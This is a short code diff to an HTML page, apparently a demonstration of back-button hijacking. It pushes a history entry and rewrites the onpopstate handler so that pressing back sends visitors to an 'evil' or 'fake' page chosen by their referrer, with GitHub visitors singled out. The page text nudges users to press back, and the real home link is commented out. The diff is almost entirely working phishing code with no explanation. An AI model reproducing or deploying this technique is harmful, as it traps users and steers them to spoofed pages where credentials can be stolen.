@@ -12,8 +12,9 @@
   <div id="content">
     <div class="jumbotron d-flex align-items-center min-vh-100">
       <div class="container text-center">
-        <h1>Page 1</h1>
-        <h2><a href="home.html">Back home</a></h2>
+        <h1>Welcome!</h1>
+        <h3>Click on the browser back button to go back</h3>
+        <!-- <h2><a href="home.html">Home</a></h2> -->
       </div>
     </div>
   </div>
@@ -52,12 +53,12 @@
   history.pushState(null, document.title, location.href);
 
   window.onpopstate = function (event) {
-    console.log(
-      `location: ${document.location}, state: ${JSON.stringify(
-        event.state
-      )}, referrer:${document.referrer}`
-    );
-    window.location.href = "home-evil.html?p=" + document.referrer;
+    // Choose fake site based on referrer
+    if (document.referrer.includes("github.com")) {
+      window.location.href = "fake-site";
+    } else {
+      window.location.href = "home-evil.html?" + document.referrer;
+    }
   };
 
   if (
